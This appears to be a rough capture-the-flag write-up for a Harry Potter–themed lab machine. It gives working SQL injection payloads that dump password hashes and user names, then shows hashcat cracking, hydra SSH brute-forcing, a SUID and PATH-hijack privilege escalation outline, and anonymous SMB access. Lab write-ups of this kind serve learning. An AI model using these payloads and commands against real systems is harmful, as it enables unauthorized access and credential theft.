```export IP=10.10.79.129```

1. ```hogwartz-castle.thm``` - add the above hostname to `/etc/hosts` or your host file

got some sqli going on here but sqlmap doesn't show much to me... "The password for Lucas Washington is incorrect! contact administrator. Congrats on SQL injection... keep digging"
time to learn sqli at bit more than ```' or 1=1--``` ? lets open burp to do some stuff

after some years..
```
user=admin%27+or+1%3D1+union+select+NULL,NULL,NULL,NULL--
user=admin%27+or+1%3D1+order+by+5--
```
both of these above leads us in believing we have 4 columns returning

different messages we go during above steps - The password for Aaliyah Allen is incorrect!, Gianna Harris, Andrea Phillips

```user=admin%27+or+1%3D1+union+select+NULL,NULL,NULL,group_concat(password,':')+from+users--```
"error":"The password for None is incorrect! c53d7af1b..."

```user=admin'+union+select+(SELECT+group_concat(notes)+FROM+'users'),NULL,NULL,NULL--``` => this hints us that the encyption used is sha512 with best64 rule
```user=admin'+union+select+(SELECT+group_concat(name)+FROM+'users'),NULL,NULL,NULL--``` => usernames => users.txt

one of the above passwords were cracked with hashcat
```hashcat -m 1700 hashlist /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule```

```echo "Luca ...  ... hy" | tr ',' '\n' | awk '{ print $1 }' | tr '[:upper:]' '[:lower:]' >> users.txt```

now lets do hydra using above user list and the cracked password

```hydra -L users.txt -p wi**23 ssh://$IP:22``` => gives us username and password(we already know this)

okay, now user1.txt and user2.txt are pretty straightforward

```find / -type f -perm /4000 2>/dev/null``` => gives us some binary with suid rights that has a weird name, so lets try to reverse that one, (/srv/time-turner/swagger)

analyse the binary, and if ypu're able to do what the binary does, only thing left would be exploit the binary using the PATH variable, (exploit is exp.c)

2. smbshares - ```smbclient -N //$IP/smabashare```

got 2 files .notes, spellnames
Hermonine, Hagrid, Lucas - usernames ?